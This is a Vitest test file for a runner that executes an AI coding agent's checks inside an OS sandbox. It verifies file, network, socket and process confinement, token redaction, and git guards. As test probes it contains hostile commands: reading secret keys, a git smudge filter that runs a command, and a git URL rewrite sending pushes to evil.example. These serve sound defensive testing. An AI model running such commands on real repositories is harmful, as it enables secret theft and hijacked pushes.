import { mkdir, mkdtemp, readdir, readFile, rm, writeFile } from "node:fs/promises";
import { createServer } from "node:net";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { runSettings } from "@software-factory/harness-claude";
import {
  CHECK_FAILURE_MAX,
  checkFailureMessage,
  type ExecutedCheck,
  type Job,
  NOT_RUN_NO_ISOLATION,
  RESULT_FILE,
} from "@software-factory/runner-contract";
import { afterEach, describe, expect, it } from "vitest";
import {
  type CheckDirs,
  checkSandbox,
  checkSandboxEnv,
  checkSandboxSettings,
  processesUnder,
  sandboxAvailable,
  sandboxedExec,
  spawnCheck,
} from "../src/check-sandbox.ts";
import { checkLoop, type Exec, GuardTripped, runChecks } from "../src/checks.ts";
import { runJob } from "../src/job.ts";
import { controlPlane, fakeAdapter, fakeCloud, git, job, scratchRepo } from "./helpers.ts";

const cleanups: (() => Promise<void>)[] = [];
afterEach(async () => {
  for (const c of cleanups.splice(0)) await c();
});
const SHA = "b".repeat(40);
const never = new AbortController().signal;

async function scratch(prefix = "sf-checks-test-"): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), prefix));
  cleanups.push(() => rm(dir, { recursive: true, force: true }));
  return dir;
}

/** A test stand-in for the OS sandbox: a plain shell in the clean tree (the tests' own code). */
const shellSandbox =
  (_job: Job, dirs: CheckDirs): Exec =>
  (command, signal) =>
    spawnCheck(
      ["/bin/sh", "-c", command.run],
      {
        cwd: dirs.dir,
        env: { PATH: process.env.PATH ?? "/usr/bin:/bin" },
        timeoutMs: command.timeoutMs,
      },
      signal,
    );

const loopBase = (root: string) => ({
  exportTree: async () => {},
  root,
  guard: async () => {},
  signal: never,
});

describe("a check process (ADR 0501)", () => {
  it("reports its exit code and output, and a timeout", async () => {
    const dir = await scratch();
    await writeFile(join(dir, "marker"), "x");
    const run = (cmd: string, timeoutMs = 5_000) =>
      spawnCheck(["/bin/sh", "-c", cmd], { cwd: dir, env: {}, timeoutMs }, never);
    expect(await run("ls marker && echo done")).toMatchObject({
      exitCode: 0,
      timedOut: false,
      output: expect.stringContaining("done"),
    });
    expect(await run("echo boom >&2; exit 3")).toMatchObject({
      exitCode: 3,
      output: expect.stringContaining("boom"),
    });
    expect(await run("sleep 5", 200)).toMatchObject({ exitCode: null, timedOut: true });
  });

  it("settles on a timeout even when a detached daemon still holds its output", async () => {
    const dir = await scratch();
    const started = Date.now();
    // perl leaves the check's process group (the kill misses it) and keeps stdout open.
    const r = await spawnCheck(
      ["/bin/sh", "-c", "perl -e 'setpgrp(0,0); sleep 4' & sleep 30"],
      { cwd: dir, env: { PATH: process.env.PATH ?? "/usr/bin:/bin" }, timeoutMs: 300 },
      never,
    );
    expect(r).toMatchObject({ exitCode: null, timedOut: true });
    expect(Date.now() - started).toBeLessThan(3_000);
  });

  it("kills everything a check started once it ends, even when it exits 0: its group, then whatever left it", async () => {
    const dir = await scratch();
    const r = await spawnCheck(
      [
        "/bin/sh",
        "-c",
        // A loop in the group, and a daemon that left it (setpgrp) and holds stdout.
        "(while :; do sleep 0.2; done) & perl -e 'setpgrp(0,0); sleep 60' & echo started",
      ],
      {
        cwd: dir,
        env: { PATH: process.env.PATH ?? "/usr/bin:/bin" },
        timeoutMs: 20_000,
        reapUnder: dir,
      },
      never,
    );
    expect(r).toMatchObject({ exitCode: 0, timedOut: false, output: "started\n" });
    expect(await processesUnder(dir)).toEqual([]);
  });

  it("counts only the sandbox child's report of the command's own exit", async () => {
    const dir = await scratch();
    const env = { PATH: process.env.PATH ?? "/usr/bin:/bin" };
    // Stand-ins for ./check-sandbox-child.mjs: what it writes on fd 3, then its own exit.
    const child = (report: string, exit = 0) =>
      spawnCheck(
        ["/bin/sh", "-c", `printf '%s\\n' '${report}' >&3; exit ${exit}`],
        { cwd: dir, env, timeoutMs: 10_000, report: true },
        never,
      );
    expect(await child('{"code":0}')).toMatchObject({ exitCode: 0 });
    expect(await child('{"code":2}')).toMatchObject({ exitCode: 2 });
    // srt's CLI would have exited 0 for these: a failure here.
    expect(await child('{"signal":"SIGTERM"}')).toMatchObject({
      exitCode: null,
      output: expect.stringContaining("killed by SIGTERM"),
    });
    expect(await child('{"signal":"SIGINT"}')).toMatchObject({ exitCode: null });
    // No report, or one that can't be attributed: a failure.
    expect(await child("")).toMatchObject({ exitCode: null });
    expect(await child("not json")).toMatchObject({ exitCode: null });
    expect(await child('{"code":0}', 1)).toMatchObject({ exitCode: null });
    // The sandbox couldn't start: not run, never a pass and never a fix round.
    expect(await child('{"error":"no bwrap"}', 1)).toMatchObject({
      exitCode: null,
      notRun: expect.stringContaining("the sandbox could not start"),
    });
  });
});

/**
 * Whether to run the real OS sandbox tests: where it is available, and always under
 * SF_REQUIRE_SANDBOX (CI), so a runner without bubblewrap fails them instead of skipping.
 */
const requireSandbox = process.env.SF_REQUIRE_SANDBOX === "1";
const realSandbox = requireSandbox || sandboxAvailable();

describe("the check sandbox (ADR 0501 on ADR 0270)", () => {
  it.runIf(requireSandbox)("has the OS sandbox on this machine (required here)", () => {
    expect(sandboxAvailable()).toBe(true);
  });

  const j = job({
    harness: {
      id: "claude-code",
      role: "implement",
      prompt: "x",
      profile: { allowedDomains: ["example.org"] },
    },
  });

  it("takes the harness's floor: its home deny lists, the runner's dirs, the job's allowlist", () => {
    const s = checkSandboxSettings(
      j,
      { root: "/t/sf-checks/job_1-x", dir: "/t/sf-checks/job_1-x/tree-0" },
      { protectPaths: ["/runner/config", "/runner/runs"], platform: "darwin", home: "/Users/o" },
    );
    expect(s.filesystem.denyRead).toEqual(
      expect.arrayContaining([
        "/Users/o/.ssh",
        "/Users/o/.config/gh",
        "/Users/o/Library/Keychains",
        "/runner/config",
        "/runner/runs",
        // other jobs' checks; this job's root is re-allowed
        "/t/sf-checks",
      ]),
    );
    expect(s.filesystem.allowRead).toEqual([
      "/t/sf-checks/job_1-x/tree-0",
      "/t/sf-checks/job_1-x/home",
      "/t/sf-checks/job_1-x/tmp",
      "/t/sf-checks/job_1-x/empty",
      "/t/sf-checks/job_1-x/gitconfig",
    ]);
    // Its own tree, home and temp: not the rest of its root (the host's empty tool dirs and git
    // config, a later round's tree).
    expect(s.filesystem.allowWrite).toEqual([
      "/t/sf-checks/job_1-x/tree-0",
      "/t/sf-checks/job_1-x/home",
      "/t/sf-checks/job_1-x/tmp",
    ]);
    expect(s.filesystem.denyWrite).toEqual(
      expect.arrayContaining([
        "/Users/o/.ssh",
        "/runner/config",
        "/runner/runs",
        "/t/sf-checks/job_1-x/empty",
        "/t/sf-checks/job_1-x/gitconfig",
      ]),
    );
    expect(s.network.allowedDomains).toEqual(
      expect.arrayContaining(["registry.npmjs.org", "example.org"]),
    );
    expect(s.network.strictAllowlist).toBe(true);
  });

  it("gives the check a home and temp of its own and none of the owner's tokens", async () => {
    const root = await scratch();
    const env = await checkSandboxEnv(root, {
      PATH: "/usr/bin",
      HOME: "/Users/o",
      GITHUB_TOKEN: "ghp_x",
      CLOUDFLARE_API_TOKEN: "cf",
      ANTHROPIC_API_KEY: "sk",
      SSH_AUTH_SOCK: "/tmp/agent",
    });
    expect(env).toMatchObject({
      PATH: "/usr/bin",
      HOME: join(root, "home"),
      TMPDIR: join(root, "tmp"),
      GITHUB_TOKEN: "",
      CLOUDFLARE_API_TOKEN: "",
      SSH_AUTH_SOCK: "",
      GIT_CONFIG_NOSYSTEM: "1",
    });
    expect(env.ANTHROPIC_API_KEY).toBeUndefined();
  });

  it("is null where the OS sandbox can't run, so nothing runs as the owner", () => {
    expect(checkSandbox({ protectPaths: [], available: false })).toBeNull();
    expect(sandboxAvailable("win32")).toBe(false);
  });

  it.runIf(realSandbox)(
    "really confines a check: no reads of protected paths, no writes outside its tree, no network off the list",
    async () => {
      const outside = await scratch("sf-secret-");
      await writeFile(join(outside, "key"), "secret");
      const parent = await scratch("sf-checks-root-");
      const root = join(parent, "job_1-x");
      const dir = join(root, "tree-0");
      await mkdir(dir, { recursive: true });
      const sandbox = checkSandbox({ protectPaths: [outside] });
      expect(sandbox).not.toBeNull();
      const exec = (sandbox as NonNullable<typeof sandbox>)(j, { root, dir });
      const r = await exec(
        {
          run: [
            `cat ${outside}/key && echo READ-PROTECTED`,
            `echo x > ${outside}/w && echo WROTE-OUTSIDE`,
            "echo x > /tmp/sf-check-probe-$$ && echo WROTE-TMP",
            `echo x > ${homedir()}/.sf-check-probe && echo WROTE-HOME`,
            "curl -sS -m 5 https://example.com >/dev/null && echo REACHED-NETWORK",
            "echo ok > here && cat here",
          ].join("; "),
          timeoutMs: 30_000,
        },
        never,
      );
      expect(r.output).not.toMatch(
        /READ-PROTECTED|WROTE-OUTSIDE|WROTE-TMP|WROTE-HOME|REACHED-NETWORK/,
      );
      expect(r.output).toContain("ok");
      expect(await readFile(join(dir, "here"), "utf8")).toBe("ok\n");
    },
    60_000,
  );

  /** A job's checks root in a scratch runner checks dir, and the real sandboxed exec for it. */
  async function realCheck(protectPaths: string[] = []) {
    const parent = await scratch("sf-checks-root-");
    const root = join(parent, "job_1-x");
    const dir = join(root, "tree-0");
    await mkdir(dir, { recursive: true });
    const sandbox = checkSandbox({ protectPaths });
    if (!sandbox) throw new Error("no sandbox");
    return { parent, root, dir, exec: sandbox(j, { root, dir }) };
  }

  it.runIf(realSandbox)(
    "fails a check that prints a failure and signals itself or its shell (srt's CLI exits 0 there)",
    async () => {
      const { exec } = await realCheck();
      const run = (cmd: string) => exec({ run: cmd, timeoutMs: 30_000 }, never);
      expect(await run("echo 1 failing; kill -TERM $$")).toMatchObject({ exitCode: null });
      expect(await run("echo 1 failing; kill -INT $$")).toMatchObject({ exitCode: null });
      expect(
        await run(`node -e "console.log('1 failing'); process.kill(process.pid, 'SIGTERM')"`),
      ).toMatchObject({ exitCode: null });
      // Nothing outside the sandbox can be signalled: the reporter above it survives.
      const parent = await run("kill -TERM $PPID; echo still-reported; exit 4");
      expect(parent).toMatchObject({
        exitCode: 4,
        output: expect.stringContaining("still-reported"),
      });
      expect(await run("echo fine")).toMatchObject({ exitCode: 0 });
    },
    120_000,
  );

  it.runIf(realSandbox)(
    "leaves nothing running after a check: a background loop, a daemon that called setsid",
    async () => {
      const { root, dir, exec } = await realCheck();
      const r = await exec(
        {
          run: [
            "(while :; do echo tick > loop.txt; sleep 0.2; done) &",
            `node -e "require('child_process').spawn('sleep', ['60'], { detached: true, stdio: 'ignore' }).unref()"`,
            "echo left-them",
          ].join("\n"),
          timeoutMs: 30_000,
        },
        never,
      );
      expect(r).toMatchObject({ exitCode: 0, output: expect.stringContaining("left-them") });
      expect(await processesUnder(root)).toEqual([]);
      // The loop is dead: the file it kept writing no longer changes.
      await rm(join(dir, "loop.txt"), { force: true });
      await new Promise((resolve) => setTimeout(resolve, 600));
      await expect(readFile(join(dir, "loop.txt"), "utf8")).rejects.toThrow();
    },
    120_000,
  );

  it.runIf(realSandbox)(
    "gives a check no settings to rewrite: none on disk, nothing writable in its root but its own dirs",
    async () => {
      const secret = await scratch("sf-secret-");
      await writeFile(join(secret, "key"), "secret");
      const { parent, root, exec } = await realCheck([secret]);
      await writeFile(join(parent, "job_2-y"), "another job's");
      // The first check tries everything a previous review used to switch the sandbox off: the
      // settings file srt used to read (gone), the host's files in the root, another job's root,
      // and a background loop that keeps trying after the check ends.
      const first = await exec(
        {
          run: [
            "ls ..",
            "for f in ../srt-settings.json ../gitconfig ../empty/npmrc ../tree-1 ../../job_2-y; do echo x > $f && echo WROTE $f; done",
            "(while :; do echo '{}' > ../srt-settings.json; sleep 0.1; done) &",
            "echo done",
          ].join("\n"),
          timeoutMs: 30_000,
        },
        never,
      );
      expect(first.output).not.toMatch(/WROTE|^srt-settings/m);
      expect(await readFile(join(parent, "job_2-y"), "utf8")).toBe("another job's");
      // The next check is as confined as the first.
      const next = await exec(
        { run: `cat ${secret}/key && echo READ-PROTECTED; echo next`, timeoutMs: 30_000 },
        never,
      );
      expect(next.output).not.toContain("READ-PROTECTED");
      expect(next.output).toContain("next");
      await expect(readFile(join(root, "srt-settings.json"), "utf8")).rejects.toThrow();
    },
    120_000,
  );

  it.runIf(realSandbox)(
    "reaches no unix socket: the factory's tmux, Docker, the ssh agent (and on macOS no login keychain)",
    async () => {
      const { exec } = await realCheck();
      // One we know is there, outside the check's root, and the real ones this machine has.
      const own = await scratch("sf-sock-");
      const server = createServer((c) => c.end("hello")).listen(join(own, "s.sock"));
      cleanups.push(() => new Promise((r) => server.close(() => r())));
      const uid = process.getuid?.() ?? 0;
      const tmuxDirs = [`/private/tmp/tmux-${uid}`, `/tmp/tmux-${uid}`];
      const tmux = (
        await Promise.all(
          tmuxDirs.map((d) =>
            readdir(d)
              .then((names) => names.map((n) => join(d, n)))
              .catch(() => [] as string[]),
          ),
        )
      ).flat();
      const sockets = [
        join(own, "s.sock"),
        ...tmux,
        "/var/run/docker.sock",
        join(homedir(), ".docker/run/docker.sock"),
        ...(process.env.SSH_AUTH_SOCK ? [process.env.SSH_AUTH_SOCK] : []),
      ];
      const probe = sockets
        .map(
          (s) =>
            `node -e "require('net').connect(process.argv[1]).on('connect', () => { console.log('CONNECTED ' + process.argv[1]); process.exit(0) }).on('error', (e) => { console.log('refused ' + process.argv[1] + ' ' + e.code); process.exit(0) })" '${s}'`,
        )
        .join("\n");
      const r = await exec({ run: probe, timeoutMs: 60_000 }, never);
      expect(r.output).not.toContain("CONNECTED");
      expect(r.output).toContain(`refused ${join(own, "s.sock")}`);
      if (process.platform === "darwin") {
        // securityd itself is reachable (the floor allows its mach service, as for the harness), but
        // the owner's keychains are not on the check's list: their dir is denied.
        const k = await exec({ run: "security list-keychains", timeoutMs: 30_000 }, never);
        expect(k.output).not.toContain(join(homedir(), "Library/Keychains"));
      }
    },
    120_000,
  );

  it.runIf(realSandbox)(
    "keeps every agent's sandbox out of the runner's checks dir: another job's agent can't forge this job's tree",
    async () => {
      // A runner data dir outside the system temp dirs the harness lets commands write (as
      // ~/.local/share/software-factory/runner is): here, beside this test.
      const data = await mkdtemp(join(fileURLToPath(new URL(".", import.meta.url)), ".runner-"));
      cleanups.push(() => rm(data, { recursive: true, force: true }));
      const checksDir = join(data, "checks");
      const victim = join(checksDir, "job_b-x", "tree-0");
      await mkdir(victim, { recursive: true });
      await writeFile(join(victim, "test.sh"), "original");
      const worktree = await scratch("sf-agent-wt-");
      const runDir = await scratch("sf-agent-run-");
      // The harness's own settings for job A's agent, with the runner's protectPaths.
      const settings = runSettings(j, { worktree, runDir, protectPaths: [checksDir] });
      const sb = settings.sandbox;
      if (!sb) throw new Error("no sandbox settings");
      const r = await sandboxedExec(
        {
          network: { ...sb.network, deniedDomains: [], strictAllowlist: true },
          filesystem: {
            denyRead: sb.filesystem.denyRead.map((p) => p.replace(/^~/, homedir())),
            allowRead: sb.filesystem.allowRead,
            allowWrite: sb.filesystem.allowWrite,
            denyWrite: sb.filesystem.denyWrite.map((p) => p.replace(/^~/, homedir())),
          },
        },
        {
          run: `echo forged > ${victim}/test.sh && echo WROTE; cat ${victim}/test.sh && echo READ; echo probe`,
          timeoutMs: 30_000,
        },
        { cwd: worktree, env: { PATH: process.env.PATH ?? "/usr/bin:/bin", HOME: homedir() } },
        never,
      );
      expect(r.output).toContain("probe");
      expect(r.output).not.toMatch(/WROTE|READ/);
      expect(await readFile(join(victim, "test.sh"), "utf8")).toBe("original");
    },
    60_000,
  );
});

describe("the host's checks (ADR 0501)", () => {
  it("records each check on the SHA it ran on, and an exec that throws as a failure", async () => {
    const exec: Exec = async (c) => {
      if (c.run === "boom") throw new Error("no container");
      return { exitCode: c.run === "ok" ? 0 : 1, timedOut: false, output: `ran ${c.run}` };
    };
    const ran = await runChecks(
      [
        { name: "lint", run: "ok", timeoutMs: 1_000 },
        { name: "tests", run: "boom", timeoutMs: 1_000 },
      ],
      exec,
      SHA,
      0,
      never,
    );
    expect(ran).toMatchObject([
      { name: "lint", exitCode: 0, headSha: SHA, logTail: "ran ok" },
      { name: "tests", exitCode: null, logTail: expect.stringContaining("no container") },
    ]);
  });

  it("fails closed without an isolated exec: every check is reported not run", async () => {
    const ran = await runChecks(
      [{ name: "tests", run: "pnpm test", timeoutMs: 1_000 }],
      null,
      SHA,
      0,
      never,
    );
    expect(ran).toMatchObject([
      { name: "tests", exitCode: null, timedOut: false, logTail: NOT_RUN_NO_ISOLATION },
    ]);
  });

  it("takes secrets out of the log tail: token shapes and the job's own", async () => {
    const exec: Exec = async () => ({
      exitCode: 1,
      timedOut: false,
      output:
        "GITHUB_TOKEN=ghs_abcdefghijklmnopqrstuvwxyz0123 job=tok-123456789 AWS_SECRET_ACCESS_KEY=abc/def",
    });
    const [r] = await runChecks(
      [{ name: "t", run: "env", timeoutMs: 1_000 }],
      exec,
      SHA,
      0,
      never,
      ["tok-123456789"],
    );
    expect(r?.logTail).not.toMatch(/ghs_|tok-123456789|abc\/def/);
    expect(r?.logTail).toContain("[redacted]");
  });

  it("sends a failure back into the session and checks its fix, guarding the git around each step", async () => {
    let fixed = false;
    let head = 0;
    const sent: string[] = [];
    const guards: string[] = [];
    const root = await scratch();
    const out = await checkLoop({
      ...loopBase(root),
      checks: { commands: [{ name: "tests", run: "pnpm test", timeoutMs: 1_000 }], fixRounds: 2 },
      exec: () => async () => ({ exitCode: fixed ? 0 : 1, timedOut: false, output: "1 failing" }),
      commit: async () => String(++head).padStart(40, "0"),
      guard: async (when) => {
        guards.push(when);
      },
      continueSession: async (text) => {
        sent.push(text);
        fixed = true;
        return "completed";
      },
    });
    expect(out.rounds).toBe(1);
    expect(out.head).toBe("2".padStart(40, "0"));
    expect(out.final).toMatchObject([{ exitCode: 0, round: 1 }]);
    expect(out.results.map((r) => [r.round, r.exitCode, r.headSha.slice(-1)])).toEqual([
      [0, 1, "1"],
      [1, 0, "2"],
    ]);
    expect(sent[0]).toMatch(/Check "tests" failed: `pnpm test` exited with 1 .* «1 failing»/);
    expect(guards).toEqual([
      "after the session",
      "after the checks of round 0",
      "after fix round 1",
      "after the checks of round 1",
    ]);
  });

  it("runs every round on a fresh clean tree of the exact commit", async () => {
    const root = await scratch();
    const exported: string[] = [];
    const seen: string[] = [];
    await checkLoop({
      ...loopBase(root),
      checks: { commands: [{ name: "tests", run: "t", timeoutMs: 1_000 }], fixRounds: 0 },
      exportTree: async (sha, dir) => {
        exported.push(sha);
        await writeFile(join(dir, "from-export"), sha);
      },
      exec: (dir) => async () => {
        seen.push(dir);
        return {
          exitCode: 0,
          timedOut: false,
          output: await readFile(join(dir, "from-export"), "utf8"),
        };
      },
      commit: async () => SHA,
    });
    expect(exported).toEqual([SHA]);
    expect(seen).toEqual([join(root, "tree-0")]);
  });

  it("stops on a tripped guard", async () => {
    const root = await scratch();
    await expect(
      checkLoop({
        ...loopBase(root),
        checks: { commands: [{ name: "tests", run: "t", timeoutMs: 1_000 }], fixRounds: 0 },
        exec: () => async () => ({ exitCode: 0, timedOut: false, output: "" }),
        commit: async () => SHA,
        guard: async (when) => {
          if (when.startsWith("after the checks")) throw new GuardTripped(`config changed ${when}`);
        },
      }),
    ).rejects.toThrow(/config changed after the checks of round 0/);
  });

  it("stops after the last round, at once when the session can't be continued, and never fixes a not-run check", async () => {
    const root = await scratch();
    const failing = () => async () => ({ exitCode: 2, timedOut: false, output: "no" });
    const commit = async () => SHA;
    const checks = { commands: [{ name: "tests", run: "t", timeoutMs: 1_000 }], fixRounds: 1 };
    let turns = 0;
    const continueSession = async () => {
      turns++;
      return "completed" as const;
    };
    const limited = await checkLoop({
      ...loopBase(root),
      checks,
      exec: failing,
      commit,
      continueSession,
    });
    expect([limited.rounds, turns]).toEqual([1, 1]);
    expect(limited.notes.at(-1)).toMatch(/a person decides/);
    const noSteer = await checkLoop({ ...loopBase(root), checks, exec: failing, commit });
    expect(noSteer.rounds).toBe(0);
    expect(noSteer.notes.at(-1)).toMatch(/can't be continued/);
    turns = 0;
    const notRun = await checkLoop({
      ...loopBase(root),
      checks,
      exec: null,
      commit,
      continueSession,
    });
    expect([notRun.rounds, turns]).toEqual([0, 0]);
    expect(notRun.final).toMatchObject([
      { exitCode: null, logTail: NOT_RUN_NO_ISOLATION, notRun: "no isolated exec on this runner" },
    ]);
    // An exec that can't run this job's check (a job with no container on a container runner, a
    // sandbox that couldn't start): "not run", never failed, and never a fix round.
    const noContainer = await checkLoop({
      ...loopBase(root),
      checks,
      exec: () => async () => ({
        exitCode: null,
        timedOut: false,
        output: "",
        notRun: "this job has no container",
      }),
      commit,
      continueSession,
    });
    expect([noContainer.rounds, turns]).toEqual([0, 0]);
    expect(noContainer.final).toMatchObject([
      {
        exitCode: null,
        notRun: "this job has no container",
        logTail: "not run: this job has no container",
      },
    ]);
    expect(noContainer.notes.join("\n")).toMatch(/tests not run/);
  });

  it("keeps the failure message within one steer", () => {
    const long: ExecutedCheck = {
      name: "tests",
      command: "pnpm test",
      exitCode: 1,
      timedOut: false,
      durationMs: 3_000,
      logTail: "x".repeat(8_000),
      headSha: SHA,
      round: 0,
    };
    const text = checkFailureMessage([long, { ...long, name: "lint" }], 1);
    expect(text.length).toBeLessThanOrEqual(CHECK_FAILURE_MAX);
    expect(text).toContain('Check "lint" failed');
  });
});

describe("the clean tree export (ADR 0501)", () => {
  it("runs no filter: an owner's smudge filter and an in-tree .gitattributes do nothing on the host", async () => {
    const repo = await scratchRepo();
    cleanups.push(repo.cleanup);
    const wt = join(repo.root, "seed");
    const pwned = join(repo.root, "PWNED");
    // The owner's own config has a filter; the agent commits a .gitattributes that applies it.
    git(wt, "config", "filter.evil.smudge", `touch ${pwned}; cat`);
    git(wt, "config", "filter.evil.clean", "cat");
    await writeFile(join(wt, ".gitattributes"), "* filter=evil\n");
    await writeFile(join(wt, "a.txt"), "as committed\n");
    git(wt, "add", ".");
    git(wt, "-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "-qm", "attrs");
    await rm(pwned, { force: true });
    const sha = git(wt, "rev-parse", "HEAD");
    const dest = join(repo.root, "tree");
    await mkdir(dest);
    await repo.host.exportTree(wt, sha, dest, join(repo.root, "index"));
    expect(await readFile(join(dest, "a.txt"), "utf8")).toBe("as committed\n");
    await expect(readFile(pwned, "utf8")).rejects.toThrow();
  });
});

describe("runJob with checks (ADR 0501)", () => {
  async function setup(j: Job, session: Parameters<typeof fakeAdapter>[1], steer = true) {
    const repo = await scratchRepo();
    cleanups.push(repo.cleanup);
    const cloud = fakeCloud();
    const cp = await controlPlane(cloud);
    cloud.claims.set("c", j);
    const adapter = fakeAdapter((x) => repo.host.clonePath(x), session, { steer });
    const checksDir = await scratch("sf-checks-parent-");
    const run = (extra: Partial<Parameters<typeof runJob>[0]> = {}) =>
      runJob({
        adapter,
        cp,
        git: repo.host,
        job: j,
        fetch: async () => new Response(null, { status: 204 }),
        flushMs: 5,
        checksDir,
        checkSandbox: shellSandbox,
        ...extra,
      });
    return { repo, cloud, adapter, run };
  }
  const handbackOf = (cloud: ReturnType<typeof fakeCloud>, j: Job) =>
    cloud.handbacks.get(j.jobId) as {
      headSha?: string;
      checks?: ExecutedCheck[];
      outcome: string;
      summary?: string;
    };

  it("runs the checks on a clean tree of the build's commit, types a failure into the same session, and pushes the checked head", async () => {
    const j = job({
      checks: {
        commands: [
          { name: "fixed", run: "test -f fixed.txt", timeoutMs: 5_000 },
          // What the session left that git ignores never reaches the check.
          { name: "clean", run: "test ! -e node_modules && test ! -e .git", timeoutMs: 5_000 },
        ],
        fixRounds: 2,
      },
    });
    let turn = 0;
    const { repo, cloud, adapter, run } = await setup(j, async (wt) => {
      turn++;
      if (turn === 1) {
        await writeFile(join(wt, ".gitignore"), "node_modules/\n");
        await mkdir(join(wt, "node_modules", "vitest"), { recursive: true });
        await writeFile(join(wt, "node_modules", "vitest", "index.js"), "patched");
        await writeFile(join(wt, "README.md"), "# scratch\nfirst\n");
        await writeFile(join(wt, RESULT_FILE), JSON.stringify({ notes: "first" }));
      } else {
        await writeFile(join(wt, "fixed.txt"), "fixed\n"); // left uncommitted: the host commits it
      }
      return [{ type: "session.ended" as const, outcome: "completed" as const }];
    });
    const report = await run();
    expect(report.outcome, `${report.error} ${report.summary}`).toBe("completed");
    expect(adapter.steered).toHaveLength(1);
    expect(adapter.steered[0]).toMatch(/`test -f fixed.txt` exited with 1/);
    const handback = handbackOf(cloud, j);
    expect(handback.checks?.map((c) => [c.name, c.round, c.exitCode])).toEqual([
      ["fixed", 0, 1],
      ["clean", 0, 0],
      ["fixed", 1, 0],
      ["clean", 1, 0],
    ]);
    expect(handback.checks?.[3]?.headSha).toBe(handback.headSha);
    expect(git(repo.bare, "rev-parse", j.branch)).toBe(handback.headSha);
    expect(git(repo.bare, "ls-tree", "-r", "--name-only", j.branch)).toContain("fixed.txt");
  });

  it("fails closed without an isolated exec: reported not run, no fix round, the build still hands back", async () => {
    const j = job({
      checks: { commands: [{ name: "tests", run: "true", timeoutMs: 5_000 }], fixRounds: 2 },
    });
    const { cloud, adapter, run } = await setup(j, async (wt) => {
      await writeFile(join(wt, "README.md"), "# scratch\nchanged\n");
      return [{ type: "session.ended" as const, outcome: "completed" as const }];
    });
    const report = await run({ checkSandbox: null });
    expect(report.outcome).toBe("completed");
    expect(adapter.steered).toHaveLength(0);
    const handback = handbackOf(cloud, j);
    expect(handback.checks).toMatchObject([
      { name: "tests", exitCode: null, logTail: NOT_RUN_NO_ISOLATION, headSha: handback.headSha },
    ]);
    expect(handback.summary).toMatch(/not run/);
  });

  it("never runs a job's checks on this machine when the runner's jobs live elsewhere (a container, a sprite)", async () => {
    for (const cap of ["container-isolation", "cloud-sandbox"]) {
      const j = job({
        checks: { commands: [{ name: "tests", run: "true", timeoutMs: 5_000 }], fixRounds: 2 },
      });
      const { cloud, adapter, run } = await setup(j, async () => [
        { type: "session.ended" as const, outcome: "completed" as const },
      ]);
      const manifest = adapter.manifest.bind(adapter);
      adapter.manifest = async () => {
        const m = await manifest();
        // `cloud-sandbox` is PR #74's capability for a sprite runner; not in this contract yet.
        return { ...m, capabilities: [...m.capabilities, cap as (typeof m.capabilities)[number]] };
      };
      let hostRan = false;
      await run({
        checkSandbox: (jj, dirs) => {
          hostRan = true;
          return shellSandbox(jj, dirs);
        },
      });
      expect(hostRan).toBe(false);
      expect(handbackOf(cloud, j).checks).toMatchObject([
        { name: "tests", exitCode: null, notRun: "no isolated exec on this runner" },
      ]);
    }
  });

  it("re-runs the git guards after the checks: a check that rewires git fails the job and nothing is pushed", async () => {
    const repoBox: { wt?: string } = {};
    const j = job({
      checks: {
        commands: [
          // A test stand-in for code under check that escapes to the worktree (the real sandbox
          // and the check container can't reach it): it adds a URL rewrite for the push.
          {
            name: "evil",
            run: 'git -C "$WT" config url.https://evil.example/.insteadOf https://github.com/',
            timeoutMs: 5_000,
          },
        ],
        fixRounds: 0,
      },
    });
    const { repo, cloud, run } = await setup(j, async (wt) => {
      repoBox.wt = wt;
      await writeFile(join(wt, "README.md"), "# scratch\nchanged\n");
      return [{ type: "session.ended" as const, outcome: "completed" as const }];
    });
    const report = await run({
      checkSandbox: (_job, dirs) => (command, signal) =>
        spawnCheck(
          ["/bin/sh", "-c", command.run],
          {
            cwd: dirs.dir,
            env: { PATH: process.env.PATH ?? "", WT: repoBox.wt ?? "" },
            timeoutMs: command.timeoutMs,
          },
          signal,
        ),
    });
    expect(report.outcome).toBe("failed");
    expect(report.error).toMatch(/git config changed after the checks of round 0/);
    expect(handbackOf(cloud, j).headSha).toBeUndefined();
    expect(() => git(repo.bare, "rev-parse", "--verify", j.branch)).toThrow();
  });

  it("re-runs the adapter's own git dir check after the checks (a container's job repo)", async () => {
    const j = job({
      checks: { commands: [{ name: "tests", run: "true", timeoutMs: 5_000 }], fixRounds: 0 },
    });
    let calls = 0;
    const { cloud, adapter, run } = await setup(j, async (wt) => {
      await writeFile(join(wt, "README.md"), "# scratch\nchanged\n");
      return [{ type: "session.ended" as const, outcome: "completed" as const }];
    });
    adapter.checkWorkspace = async () =>
      ++calls >= 2 ? ["the session created commondir in its git dir"] : [];
    const report = await run();
    expect(report.outcome).toBe("failed");
    expect(report.error).toMatch(/commondir/);
    expect(handbackOf(cloud, j).headSha).toBeUndefined();
  });

  it("runs an attached PR's checks on its head before the reviewer session, once", async () => {
    const order: string[] = [];
    const j = job({
      stage: "verify",
      checks: { commands: [{ name: "tests", run: "true", timeoutMs: 5_000 }], fixRounds: 2 },
    });
    const { repo, cloud, run } = await setup(j, async (wt) => {
      order.push("session");
      // The reviewer leaves a change behind: it must not be what the checks saw.
      await writeFile(join(wt, "left-by-reviewer.txt"), "x");
      await writeFile(join(wt, RESULT_FILE), JSON.stringify({ verdict: "pass" }));
      return [{ type: "session.ended" as const, outcome: "completed" as const }];
    });
    const report = await run({
      checkSandbox: (jj, dirs) => {
        const inner = shellSandbox(jj, dirs);
        return async (command, signal) => {
          order.push("check");
          return inner(command, signal);
        };
      },
    });
    expect(report.outcome, `${report.error}`).toBe("completed");
    expect(order).toEqual(["check", "session"]);
    const checks = handbackOf(cloud, j).checks ?? [];
    expect(checks).toMatchObject([{ name: "tests", exitCode: 0, round: 0 }]);
    expect(checks[0]?.headSha).toBe(git(repo.bare, "rev-parse", j.repo.baseRef));
  });
});
